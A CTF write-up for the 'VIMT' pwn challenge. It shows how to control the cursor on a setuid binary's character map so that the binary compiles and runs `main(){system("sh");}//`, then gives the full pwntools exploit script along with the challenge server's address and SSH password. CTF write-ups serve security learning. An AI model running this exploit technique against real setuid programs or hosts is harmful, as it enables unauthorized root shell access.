# VIMT

**Author**: [gallileo](https://twitter.com/galli_leo_)

**Tags:** pwn

**Points:** 856 (21 solves)

**Description:** 

> `ssh ctf@3.38.59.103 -p 1234 password: ctf1234_smiley`
> 
> Monkeys help you

Although a somewhat unconventional setup (ssh'ing into the binary[^1]), the binary itself is fairly simple and even comes with symbols. The basic functionality is as follows:

The binary creates a 2D map the size of your terminal. In a loop, it waits for you to enter a character. The character gets placed at the current position in the map, followed by 5 random characters. In addition, by sending a `\x1b` character, a command could be executed. The interesting commands are:

- `compile`: Compiles the current map as C code and executes the result.
- `set`: Set the y coordinate of the current map position.

We also notice some interesting setup code in `init`:

```c
v4 = clock();
v3 = time(0LL);
v0 = getpid();
v1 = mix(v4, v3, v0); // some z3 looking combination of inputs.
srand(v1);
```

To me it looked like the intentional solution might have been to reverse the mix function and figure out the random seed to predict which additional letters get added to the map. However, we can actually solve this without having to do that.
I noticed, that by having a prime terminal width, we could actually also set the x coordinate. If we can set the x coordinate, we can of course create arbitrary map contents.

If our terminal has a width of 29 and every time we enter a character the x position moves by 6, we can do the following:

1. Enter 5 characters, now x position moves by 30 (with wrap around)
2. This means x position is now actually one after the original x position

Since we can reset the y position to the original value, we can hence control the x position and can write anything on the map. Since doing this on the server was very slow (for some reason) and I probably made a mistake with my python code (more than one line would break it), we wanted a payload that is shorter than 29 characters. Luckily the following worked `main(){system("sh");}//`.

Now the only thing left was fighting with pwntools, ssh and pseudoterminals (aka try random options until you get it to work) to actually have the correctly sized terminal on the remote. After that, it was just waiting around 20 minutes and then we got a shell. For some reason, I did not see any stdout of the remote terminal (except newlines maybe), so I had to exfil the flag with some bash magic.

The final exploit script:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template app
from pwn import *
import random

# Set up pwntools for the correct architecture
exe = context.binary = ELF('app')


def local(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, stdin=PTY, raw=False, *a, **kw)

def remote():
    #return ssh("ctf", host="3.38.59.103", port=1234, password="ctf1234_smiley")
    # stty cols 29 rows 12
    p = process("sshpass -e ssh -tt ctf@3.38.59.103 -p 1234 'bash -i'", shell=True, env={"SSHPASS": "ctf1234_smiley"})
    p.sendlineafter("~$ ", "stty cols 29 rows 12")
    p.sendlineafter("~$ ", "./app")
    return p

def start(*a, **kw):
    if args.LOCAL:
        return local(*a, **kw)
    return remote(*a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

#### remote comms
WIDTH = 29
HEIGHT = 10

def read_mappa():
    begin = io.recvuntil(b"-"*WIDTH)
    read_map = io.recvuntil(b"-"*WIDTH)
    log.debug("REMOTE MAP:\n%s", read_map.decode("utf8", errors="ignore"))
    return begin + read_map

def send_data(data):
    if isinstance(data, str):
        data = data.encode("utf8")
    io.send(data)
    return read_mappa()

def send_command(cmd, read = True):
    io.send(b"\x1b")
    if isinstance(cmd, str):
        cmd = cmd.encode("utf8")
    io.sendline(cmd)
    if read:
        return read_mappa()
    return None

def do_compile():
    return send_command("compile", False)

def do_set_y(y_val):
    return send_command(f"set y {y_val}")

RAND_CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}!"

log.info("Using terminal of size %d x %d", WIDTH, HEIGHT)

mappa = []
for y in range(HEIGHT):
    row = ""
    for x in range(WIDTH):
        row += " "
    mappa.append(row)

cur_x = 0
cur_y = 0

def check_coords_up():
    global cur_x, cur_y
    if cur_x >= WIDTH:
        cur_x = 0
        cur_y += 1
    if cur_y >= HEIGHT:
        cur_y = HEIGHT - 1

def set_car(car):
    global mappa, cur_y, cur_x
    row = mappa[cur_y]
    mappa[cur_y] = row[:cur_x] + car + row[cur_x+1:]

def inpKey(car):
    global cur_x
    rem_map = send_data(car)
    check_coords_up()
    set_car(car)
    cur_x += 1
    for i in range(5):
        check_coords_up()
        rand_car = random.choice(RAND_CHARS)
        set_car(rand_car)
        cur_x += 1
    return rem_map

def set_y(y_val):
    global cur_y
    do_set_y(y_val)
    cur_y = y_val

def set_x(x_val):
    global cur_y, cur_x
    if cur_x == x_val:
        return
    # this is more involved!

    # number of times to enter a character for a row to be filled.
    # every time we enter a character, we write 6 to the map!
    min_to_fill = (WIDTH // 6) + 1
    # number of characters the new x position on the next row will be offset
    offset = min_to_fill * 6 - WIDTH
    # we could actually use any offset, would just mean more math lol
    assert offset == 1
    # number of characters difference between desired and required x val
    diff = (x_val - cur_x)
    if diff < 0:
        diff += WIDTH
    num_inputs = (diff // offset) * min_to_fill
    log.debug("Additional inputs: %d", num_inputs)
    for k in range(num_inputs):
        inpKey("G")
    log.debug("cur_x %d vs x_val %d", cur_x, x_val)
    assert cur_x == x_val


def pmap():
    log.info("MAP:\n%s", "\n".join(mappa))

def write_line(y, s: str):
    log.debug("Writing line %s @ y = %d", s, y)
    for idx, car in enumerate(s):
        set_x(idx)
        set_y(y)
        inpKey(car)
    set_x(len(s))
    set_y(y)
    inpKey("\n")

def write_str(start_x, start_y, s: str):
    x = start_x
    y = start_y
    for idx, car in enumerate(s):
        
        if x >= WIDTH:
            x = 0
            y =+ 1
        if y >= HEIGHT:
            log.error("FAILED TO WRITE STRING!")
        log.info("Writing %s at %d, %d", car, x, y)
        set_x(x)
        set_y(y)
        rem_map = inpKey(car)
        if idx % 10:
            log.info("remote map:\n%s", rem_map.decode("utf8", errors="ignore"))
        x += 1

log.info("Initial map:")
pmap()

io = start()
# io.interactive()
init_map = read_mappa()
log.info("init remote map:\n%s", init_map.decode("utf8", errors="ignore"))

PAYLOAD = """main(){system("sh");}//"""
log.info("PAYLOAD:\n%s", PAYLOAD)

write_str(0, 0, PAYLOAD)
log.info("map with payload:")
pmap()
log.info("Writing map to file: test.c")
with open("test.c", "w") as f:
    f.write("".join(mappa))

rem_map = send_data("$")
log.info("Remote map:\n%s", rem_map.decode("utf8", errors="ignore"))
pause()
do_compile()
io.interactive()

```

[^1]: The setup actually allowed you to get a terminal on the server. However, since the flag is only readable by root and the challenge binary is setuid, we still need to pwn the binary.
